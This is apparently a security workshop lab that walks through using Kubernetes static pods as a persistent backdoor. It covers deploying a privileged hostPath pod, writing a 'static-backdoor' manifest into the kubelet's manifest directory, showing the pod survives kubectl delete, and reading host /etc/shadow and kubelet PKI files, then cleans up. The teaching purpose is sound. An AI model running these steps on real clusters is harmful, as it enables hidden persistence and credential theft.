# Static Pods

An attacker who gains write access to a node's filesystem can drop a manifest file into the kubelet's static pod directory. The kubelet creates the pod immediately — with no involvement from the API server's admission controllers — and automatically restarts it if it is deleted through `kubectl`. This makes static pods one of the most persistent and difficult-to-remove backdoor techniques in Kubernetes.

## Description

Static pods are managed directly by the `kubelet` daemon on a specific node, not by the Kubernetes control plane. Key attacker-relevant properties:

- **Bypasses admission controllers** — mutating and validating webhooks (e.g., OPA/Gatekeeper, Kyverno) are not invoked for static pods.
- **Mirror pods are visible but not deletable** — the API server creates a read-only "mirror pod" so the pod appears in `kubectl get pods`, but issuing `kubectl delete pod` only removes the mirror; the kubelet recreates the mirror within seconds.
- **Survives API server outages** — the kubelet manages the pod lifecycle independently.
- **Persistence on the node** — as long as the manifest file exists on the node's filesystem, the pod will always be running.

The attack requires writing a file to the kubelet's `staticPodPath` directory. This is typically achieved by first obtaining a privileged container that mounts the host filesystem.

> **Note:** The static pod directory varies by distribution:
>
> | Distribution | Static Pod Path | Kubelet Config |
> |---|---|---|
> | Kind / kubeadm | `/etc/kubernetes/manifests` | `/var/lib/kubelet/config.yaml` |
> | k3s | `/var/lib/rancher/k3s/agent/pod-manifests` | `/var/lib/rancher/k3s/agent/etc/containerd/config.toml` |
> | RKE2 | `/var/lib/rancher/rke2/agent/pod-manifests` | `/var/lib/rancher/rke2/agent/etc/containerd/config.toml` |
> | MicroK8s | `/var/snap/microk8s/common/args/conf.d/` | via snap config |
>
> k3s and RKE2 do not ship control-plane components as static pods — they run them as embedded processes. The static pod directory still exists and works, but it will be empty by default.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has obtained credentials that grant `create pods` with `privileged: true` and a `hostPath` volume mount (or direct node access via SSH).

## Quick Start

### Step 1 — Deploy a privileged pod with host filesystem access

The first stage of this attack is obtaining write access to the node's filesystem. Deploy a privileged pod that mounts the host root filesystem at `/host`:

```bash
kubectl apply -f privileged-pod.yaml
```

Wait for the pod to start:

```bash
kubectl wait --for=condition=Ready pod/node-access --timeout=60s
```

Confirm you can read the host filesystem:

```bash
kubectl exec node-access -- ls /host/etc/kubernetes/
```

Expected output on a **Kind / kubeadm** control-plane node:

```
admin.conf  controller-manager.conf  kubelet.conf  manifests  pki  scheduler.conf  super-admin.conf
```

> **k3s / RKE2:** The `/etc/kubernetes/` directory may not exist or may be sparse. Instead, check:
> ```bash
> kubectl exec node-access -- ls /host/var/lib/rancher/k3s/agent/pod-manifests/
> ```

### Step 2 — Locate the kubelet static pod directory

The kubelet reads static pod manifests from the path configured in its config file. Find it by inspecting the kubelet configuration:

**Kind / kubeadm:**

```bash
kubectl exec node-access -- cat /host/var/lib/kubelet/config.yaml | grep static
```

Expected output:

```
staticPodPath: /etc/kubernetes/manifests
```

**k3s:**

```bash
kubectl exec node-access -- sh -c '
  # k3s embeds the kubelet; the static pod path is fixed:
  STATIC_PATH="/var/lib/rancher/k3s/agent/pod-manifests"
  if [ -d "/host${STATIC_PATH}" ]; then
    echo "staticPodPath: ${STATIC_PATH}"
  else
    echo "Static pod directory not found — check your distribution docs"
  fi
'
```

Set a variable for the rest of the tutorial (adjust for your distribution):

```bash
# Kind / kubeadm:
STATIC_POD_PATH="/etc/kubernetes/manifests"

# k3s:
# STATIC_POD_PATH="/var/lib/rancher/k3s/agent/pod-manifests"

# RKE2:
# STATIC_POD_PATH="/var/lib/rancher/rke2/agent/pod-manifests"
```

Inspect the existing static pod manifests:

```bash
kubectl exec node-access -- ls /host${STATIC_POD_PATH}/
```

Expected output on a **Kind / kubeadm** control-plane node:

```
etcd.yaml  kube-apiserver.yaml  kube-controller-manager.yaml  kube-scheduler.yaml
```

> **k3s / RKE2:** This directory will be empty by default — these distributions run control-plane components as embedded processes, not static pods. The directory still works for deploying your own static pods.

### Step 3 — Write the malicious static pod manifest

The file `static-pod-manifest.yaml` defines a privileged backdoor pod. Copy it to the node's static pod directory through the `/host` mount using `kubectl cp`:

```bash
kubectl cp static-pod-manifest.yaml \
    node-access:/host${STATIC_POD_PATH}/static-backdoor.yaml
```

Verify the file was written:

```bash
kubectl exec node-access -- ls -la /host${STATIC_POD_PATH}/static-backdoor.yaml
```

> **Note:** The `kubectl exec -- sh -c "cat > /path" < localfile` pattern does **not** work with `kubectl exec` — stdin redirection applies to the local shell, not the exec session. Use `kubectl cp` to transfer files into a running pod.

### Step 4 — Observe the kubelet create the static pod

The kubelet watches the manifest directory and picks up new files within a few seconds. The pod will appear in the API server as a mirror pod:

```bash
kubectl get pods -n kube-system --watch
```

Look for a pod named `static-backdoor-<node-name>`. The kubelet appends the hostname of the node where it runs. This is the mirror pod created by the API server.

Expected output examples:

```
# Kind (node name = kind-control-plane):
static-backdoor-kind-control-plane           1/1     Running   0          8s

# k3s (node name = server1):
static-backdoor-server1                      1/1     Running   0          8s
```

> **Tip:** Find your node name with `kubectl get nodes` and look for `static-backdoor-<your-node-name>` in the output.

### Step 5 — Demonstrate that kubectl delete does NOT remove the pod

Try to delete the mirror pod using kubectl (replace `<node-name>` with your actual node name from Step 4):

```bash
kubectl delete pod -n kube-system static-backdoor-<node-name>
```

Expected output:

```
pod "static-backdoor-<node-name>" deleted
```

Wait a few seconds and check again:

```bash
kubectl get pods -n kube-system | grep static-backdoor
```

The pod is back. The kubelet recreates the mirror pod immediately because the manifest file still exists on disk. **The only way to remove a static pod is to delete the manifest file from the node.**

### Step 6 — Verify host-level capabilities of the static pod

Exec into the static pod and confirm its capabilities (replace `<node-name>` with your actual node name):

```bash
kubectl exec -n kube-system static-backdoor-<node-name> -- sh -c '
  # Read host /etc/shadow
  cat /host/etc/shadow | head -5

  # Read kubelet credentials
  ls /host/etc/kubernetes/pki/ 2>/dev/null || ls /host/var/lib/kubelet/pki/

  # List host processes
  ls /proc | head -20
'
```

### Step 7 — Clean up: remove the manifest file

Removing the static pod requires deleting the manifest file from the node filesystem — not just running `kubectl delete`:

```bash
kubectl exec node-access -- rm /host${STATIC_POD_PATH}/static-backdoor.yaml
```

Confirm the static pod is gone:

```bash
kubectl get pods -n kube-system | grep static-backdoor
```

## Cleanup

```bash
# Remove the manifest file from the node (if not already done in Step 7)
# Use the STATIC_POD_PATH you set in Step 2
kubectl exec node-access -- rm -f /host${STATIC_POD_PATH}/static-backdoor.yaml

# Wait a few seconds and confirm the static pod mirror is gone
kubectl get pods -n kube-system | grep static-backdoor

# Delete the privileged pod used for node access
kubectl delete -f privileged-pod.yaml
```

> **Emergency cleanup:** If the `node-access` pod is no longer running, remove the manifest file directly on the node:
> ```bash
> # Kind:
> docker exec kind-control-plane rm -f /etc/kubernetes/manifests/static-backdoor.yaml
>
> # k3s (SSH to the node):
> sudo rm -f /var/lib/rancher/k3s/agent/pod-manifests/static-backdoor.yaml
> ```

## Resources

- [Static Pods](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)
- [Kubelet Configuration](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/)
- [MITRE ATT&CK for Containers — Static Pods](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Static%20Pods/)
